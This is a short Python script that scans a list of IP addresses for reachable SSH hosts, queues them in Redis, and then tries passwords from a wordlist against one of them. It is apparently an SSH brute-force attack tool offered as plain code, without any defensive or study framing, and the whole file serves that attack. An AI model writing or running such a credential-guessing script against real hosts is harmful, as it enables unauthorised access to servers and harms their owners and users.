#!/usr/bin/env python3
# coding: utf-8

import multiprocessing
from sshconnector import sshconnector
import redis
import asyncio

r = redis.Redis(host='127.0.0.1', port=6379, db=0)


def add_unuse_hosts():
    def save_host(host):
        r.sadd('host:unuse', host)
        r.save()

    conn = sshconnector.Conn(thread_num=10)
    loop = asyncio.get_event_loop()
    conn.test_hosts(loop, './data/ip.csv', save_host)


def try_password():
    process = multiprocessing.Pool(multiprocessing.cpu_count())
    host = r.spop('host:unuse')
    conn = sshconnector.Conn(host=host, thread_num=3)
    conn.test_passwords('./data/passwords.txt')


if __name__ == '__main__':
    # add_unuse_hosts()
    try_password()
